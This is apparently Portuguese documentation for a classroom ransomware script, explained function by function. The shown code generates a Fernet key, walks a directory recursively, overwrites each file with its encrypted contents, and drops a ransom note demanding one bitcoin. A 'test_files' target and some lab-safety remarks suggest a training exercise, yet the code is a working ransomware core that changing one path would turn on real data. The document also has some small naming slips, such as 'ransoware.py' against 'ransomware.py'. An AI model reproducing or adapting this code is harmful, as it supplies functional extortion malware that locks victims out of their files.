# Documentação do arquivo ransoware.py

## `1. Importação da Biblioteca de Criptografia`

```python
from cryptography.fernet import Fernet
```
### Explicação:
**from cryptography:** Acessa o pacote principal da biblioteca cryptography instalada.

**import Fernet:** Importa especificamente a classe Fernet de dentro do pacote.

## O que é Fernet?
Fernet é um formato de criptografia simétrica (a mesma chave criptografa e descriptografa) que segue padrões seguros e modernos. Ele abstrai a complexidade de algoritmos como AES-128, garantindo que você use a criptografia corretamente sem precisar ser um especialista em criptologia.

## `2. Importação do Módulo do Sistema Operacional`

```python
from os
```

### Explicação:
**import os:** Importa o módulo padrão os (de Operating System) do Python.

## O que o módulo os faz?
Este módulo fornece uma maneira portátil de interagir com funcionalidades dependentes do sistema operacional (como Windows, Linux, macOS). É amplamente utilizado para tarefas como:

* Navegar por diretórios: Mudar a pasta de trabalho atual.

* Listar arquivos: Obter uma lista de arquivos e diretórios em um caminho específico.

* Manipular caminhos: Combinar ou separar nomes de arquivos e diretórios de forma compatível com o sistema operacional.

* Verificar tipos de arquivo: Determinar se um caminho se refere a um arquivo, um diretório, etc.

* Criar, remover e gerenciar diretórios e arquivos.

* Executar comandos do sistema operacional.

O módulo os é uma ferramenta fundamental para scripts que precisam interagir com o sistema de arquivos ou com o ambiente do sistema operacional onde estão sendo executados.


## `3. Função gerar chave`

```python
# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    # Gera a chave
    chave = Fernet.generate_key()
    
    # Salva a chave no arquivo (corrigido: 'write' em vez de 'wite')
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
```

## O que o módulo os faz?
Essa função Python, gerar_chave(), tem como objetivo criar uma chave secreta que será usada tanto para criptografar quanto para descriptografar os arquivos (criptografia simétrica).

### 1. def gerar_chave():

* Define uma função chamada gerar_chave. Quando você chamar essa função no seu programa principal, ela executará as instruções contidas nela.

### 2. chave = Fernet.generate_key()

* Esta linha é a ação principal da função. Ela usa o método generate_key() da classe Fernet (que você importou da biblioteca cryptography).

* Fernet é um padrão de criptografia seguro que usa o algoritmo AES-128.

* O resultado é uma chave criptográfica única, gerada aleatoriamente, que é crucial para todo o processo de criptografia e descriptografia. Essa chave é armazenada na variável chave.

### 3. with open("chave.key", "wb") as chave_file:

* Abre um arquivo chamado "chave.key" no sistema de arquivos.

* O modo "wb" significa "write binary" (escrever binário). As chaves criptográficas geradas pelo Fernet não são texto simples; elas são dados binários codificados, então precisamos escrevê-las neste formato.

* as chave_file atribui o arquivo aberto a uma variável temporária chamada chave_file para que possamos interagir com ele dentro do bloco with.

* O uso do with garante que o arquivo seja fechado automaticamente, mesmo que ocorram erros.

### 4. chave_file.wite(chave)

* ⚠️ Atenção: Há um pequeno erro de digitação no código que você forneceu. O método correto é write (escrever), não wite.

* Esta linha escreve o conteúdo da variável chave (a chave secreta que acabamos de gerar) no arquivo "chave.key".

## `4. Função carregar chave`

```python
# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()
```

## O que o módulo os faz?
Esta função Python, carregar_chave(), é responsável por ler a chave de criptografia secreta que foi gerada e salva anteriormente no arquivo chave.key.

### 1. def carregar_chave():

* Define uma função chamada carregar_chave. O objetivo desta função é simplesmente retornar a chave para qualquer outra parte do script que precise criptografar ou descriptografar arquivos.

### 2. open("chave.key", "rb")
* Esta parte abre o arquivo chave.key que foi criado pela função gerar_chave().

* O modo "rb" significa "read binary" (ler binário). Como a chave foi salva em formato binário ("wb"), ela deve ser lida no mesmo formato para garantir que os dados não sejam corrompidos.

### 3. .read()
* Após abrir o arquivo, o método .read() lê todo o conteúdo do arquivo (que é a própria chave secreta) e o retorna como um objeto bytes.

### 4. return ...
* A função termina retornando esses bytes lidos. Quando você chama chave_secreta = carregar_chave(), a variável chave_secreta conterá a chave necessária para o Fernet funcionar.

## `5. Função criptografar arquivo`

```python
# 3. Criptografar um unico arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_enctriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_enctriptados)
```

## O que o módulo os faz?
Esta função pega um arquivo específico e uma chave secreta, lê o conteúdo do arquivo, criptografa esses dados e sobrescreve o arquivo original com os dados criptografados.

### Resumo das Etapas:

* Cria o Criptografador: f = Fernet(chave) cria a ferramenta de criptografia.

* Lê (Read Binary): O primeiro with open(..., "rb") lê o conteúdo original.

* Criptografa: f.encrypt(dados) faz a mágica.

* Escreve (Write Binary): O segundo with open(..., "wb") apaga o original e salva a versão criptografada.

## `6. Função encontrar arquivos`

```python
# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista
```

## O que o módulo os faz?
Esta função, encontrar_arquivos(), tem como objetivo percorrer uma estrutura de diretórios, começando de um ponto inicial especificado, e listar todos os arquivos que são alvos potenciais para criptografia, ignorando o próprio script de ransomware e o arquivo de chave.

### 1. def encontrar_arquivos(diretorio):
* Define a função que aceita um argumento diretorio (o caminho inicial de onde a busca deve começar, por exemplo, C:\\Users\\SeuUsuario ou . para o diretório atual).

### 2. lista = []
* Cria uma lista vazia chamada lista. Esta lista armazenará o caminho completo (path) de cada arquivo que a função decidir que deve ser criptografado.

### 3. for raiz, _, arquivos in os.walk(diretorio):
* Esta é a parte crucial que usa o módulo os. O os.walk() é um gerador poderoso que "caminha" pela árvore de diretórios de forma recursiva (entra em subpastas, sub-subpastas, etc.).

* A cada passo, ele retorna três valores:

    * raiz: O caminho do diretório atual (ex: C:\\Users\\fulano\\Documents).
    * _ (dirs): Uma lista de subdiretórios dentro da raiz atual (ignoramos essa lista neste script).
    * arquivos: Uma lista de apenas os nomes dos arquivos dentro da raiz atual (ex: ['foto.jpg', 'texto.txt']).

### 4. for nome in arquivos:
* Inicia um loop interno para processar cada nome de arquivo individualmente na lista arquivos retornada pelo os.walk().

### 5. caminho = os.path.join(raiz, nome)
* Combina a raiz (o diretório completo) com o nome do arquivo para criar o caminho completo e utilizável do arquivo (ex: C:\\Users\\fulano\\Documents\\foto.jpg).

### 6. if nome != "ransomware.py" and not nome.endswith(".key"):
* Esta é a lógica de exclusão para evitar que o próprio script de ataque ou a chave de descriptografia sejam corrompidos, o que tornaria a descriptografia impossível.

* nome != "ransomware.py": Ignora o arquivo do script principal.

* not nome.endswith(".key"): Ignora qualquer arquivo que termine com a extensão .key (como o chave.key que você criou).

* Correção: O código original tinha endswirh. O método correto em Python é endswith().

### 7. lista.append(caminho)
* Se o arquivo não for excluído pelas regras acima, seu caminho completo é adicionado à lista de alvos.

### 8. return lista
* Após percorrer todos os diretórios e arquivos, a função retorna a lista final contendo todos os caminhos dos arquivos que estão prontos para serem criptografados.

## `6. Função para criar mensagem de resgate`

```python
#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante.\n")
        f.write("Depois disso, enviaremos a chave para voce recuperar seus dados.\n")
```

## O que o módulo os faz?
Esta função, criar_mensagem_resgate(), é responsável por criar o arquivo de texto que notifica o usuário sobre o ataque de ransomware e fornece instruções sobre como pagar o resgate (a "nota de resgate" ou ransom note).

### 1. def criar_mensagem_resgate():
* Define a função responsável por gerar a notificação para a vítima.

### 2. with open("LEIA ISSO.txt", "w") as f:
* Abre um novo arquivo chamado "LEIA ISSO.txt".

* O modo "w" significa "write" (escrever). Se o arquivo já existir, ele será apagado e recriado; se não existir, será criado um novo arquivo de texto.

* as f atribui o arquivo aberto a uma variável chamada f para facilitar a escrita.

### 3. f.write(...)
* Cada linha usa o método .write() para inserir texto no arquivo aberto.

* A string \n (nova linha) é usada no final de cada frase para garantir que o texto apareça em linhas separadas quando o arquivo for aberto em um editor de texto (como Bloco de Notas).

### Resumo da Funcionalidade
Quando esta função é executada, ela cria um arquivo de texto simples no mesmo diretório de onde o script está rodando, contendo as instruções fictícias de resgate.

`Nota para Testes em Laboratório:` O conteúdo é um exemplo clássico de ransom note. Em um ambiente de teste controlado, você pode personalizar esta mensagem para incluir detalhes específicos do seu exercício de simulação.


## `5. Função main`

```python
#6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado!")
```

## O que o módulo os faz?
Esta é a função principal (main) do seu script de teste de ransomware. Ela orquestra a sequência de eventos, chamando todas as funções que você definiu anteriormente na ordem lógica de um ataque simulado.

### Explicação Detalhada do Fluxo:

**A função main() age como o maestro do ataque simulado:**

### 1. Geração da Chave (gerar_chave()): 
* Tudo começa criando a chave mestra necessária para o ataque. Sem isso, a criptografia não pode ocorrer.

### 2. Carregamento da Chave (carregar_chave()): 
* A chave recém-criada é lida de volta para uma variável utilizável (chave).

### 3. Localização dos Alvos (encontrar_arquivos("test_file")): 
* O script busca recursivamente por arquivos no diretório especificado ("test_file").

    * ⚠️ Nota de Teste: Certifique-se de que você criou uma pasta chamada test_file (ou similar) no seu ambiente isolado e colocou arquivos de teste inofensivos lá dentro.

### 4. Criptografia em Massa (for arquivo in arquivos:): 
* O script itera sobre a lista de arquivos alvo. Para cada arquivo, a função criptografar_arquivo() é chamada, sobrescrevendo o conteúdo original com a versão criptografada.

### 5. Aviso Final (criar_mensagem_resgate()): 
* O arquivo LEIA ISSO.txt é criado para notificar o usuário sobre o que aconteceu.

### 6. Conclusão (print(...)): 
Uma mensagem de log é impressa no terminal do VS Code confirmando que o processo foi concluído.

**Para executar o arquivo, abre o terminal do VSCode (ctrl + aspa)**
`python .\ransoware.py`